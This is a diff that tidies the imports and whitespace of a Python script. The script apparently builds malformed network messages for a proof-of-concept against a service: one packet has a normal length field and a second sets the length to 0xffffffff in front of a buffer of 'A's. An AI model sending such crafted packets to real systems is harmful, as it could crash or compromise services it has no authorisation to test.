@@ -1,5 +1,10 @@
-import sys, socket, argparse, hexdump, time
+import argparse
+import socket
+import time
 from struct import *
+
+import hexdump
+
 
 def dump(title, data):
   if debug and data:
@@ -24,10 +29,10 @@ debug = args.verbose
 
 
 fdata = b'A' * 16
-data  = pack('<II', 2, 0) 
+data  = pack('<II', 2, 0)
 data += b'\x00' * (0xa8 - len(data))
-data1 =  data + pack('<I', len(fdata)) + fdata 
-data2 =  data + pack('<I', 0xffffffff) + fdata 
+data1 =  data + pack('<I', len(fdata)) + fdata
+data2 =  data + pack('<I', 0xffffffff) + fdata
 
 msg1 = pack('<HHIII', 1, 0, 13, 0, 0) + data1
 msg1 = pack('<H', 2 + len(msg1)) + msg1
